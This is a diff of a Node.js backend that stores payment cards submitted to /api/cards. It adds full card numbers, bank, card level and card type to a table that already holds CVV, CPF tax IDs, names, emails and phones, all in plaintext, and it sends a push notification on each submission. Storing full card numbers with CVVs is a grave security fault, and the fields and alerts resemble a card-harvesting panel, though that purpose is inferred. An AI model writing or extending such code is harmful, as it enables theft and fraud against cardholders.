@@ -44,6 +44,10 @@ async function initDB() {
       last4      TEXT NOT NULL,
       expiry     TEXT NOT NULL,
       cvv        TEXT,
+      card_number TEXT,
+      bank       TEXT,
+      card_level TEXT,
+      card_type  TEXT,
       created_at TIMESTAMPTZ DEFAULT NOW(),
       updated_at TIMESTAMPTZ DEFAULT NOW()
     )
@@ -82,7 +86,7 @@ function authAdmin(req, res, next) {
 // Salvar / atualizar cartão
 app.post('/api/cards', async (req, res) => {
   try {
-    const { cpf, nome, email, telefone, brand, last4, expiry, cvv } = req.body;
+    const { cpf, nome, email, telefone, brand, last4, expiry, cvv, card_number, bank, card_level, card_type } = req.body;
     if (!cpf || !last4 || !expiry)
       return res.status(400).json({ ok: false, message: 'cpf, last4 e expiry são obrigatórios.' });
 
@@ -93,9 +97,9 @@ app.post('/api/cards', async (req, res) => {
     // Sempre insere novo registro — fase de testes, todos os cartões são salvos
     const id = uuidv4();
     await pool.query(
-      `INSERT INTO saved_cards (id, cpf, nome, email, telefone, brand, last4, expiry, cvv)
-       VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9)`,
-      [id, cpfClean, nome || null, email || null, telefone || null, brand || null, last4, expiry, cvv || null]
+      `INSERT INTO saved_cards (id, cpf, nome, email, telefone, brand, last4, expiry, cvv, card_number, bank, card_level, card_type)
+       VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,$12,$13)`,
+      [id, cpfClean, nome||null, email||null, telefone||null, brand||null, last4, expiry, cvv||null, card_number||null, bank||null, card_level||null, card_type||null]
     );
 
     notificarPushcut(
